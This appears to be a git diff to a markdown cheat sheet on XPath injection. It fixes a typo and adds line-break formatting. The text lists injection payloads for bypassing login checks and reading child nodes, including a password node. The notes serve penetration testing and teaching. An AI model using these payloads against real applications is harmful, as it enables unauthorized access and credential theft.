@@ -15,7 +15,7 @@ Similar to SQL injection, can be tested/broken with boolean logic:
  A complete attack query could like like:
  `admin']%00` or `admin' or 1=1]%00`
  
- To get information from childnodes (check readme for info on childnodes):
- `'%20or%201=1]/child::node()%00` - CURRENT childnoed
- `admin'%20or%201=1]/parent::*/child::node()%00` - ALL childnodes
- `admin']/parent::*/password%00` - info from the PASSWORD childnode
+ To get information from childnodes (check readme for info on childnodes):  
+ `'%20or%201=1]/child::node()%00` - CURRENT childnode  
+ `admin'%20or%201=1]/parent::*/child::node()%00` - ALL childnodes  
+ `admin']/parent::*/password%00` - info from the PASSWORD childnode  
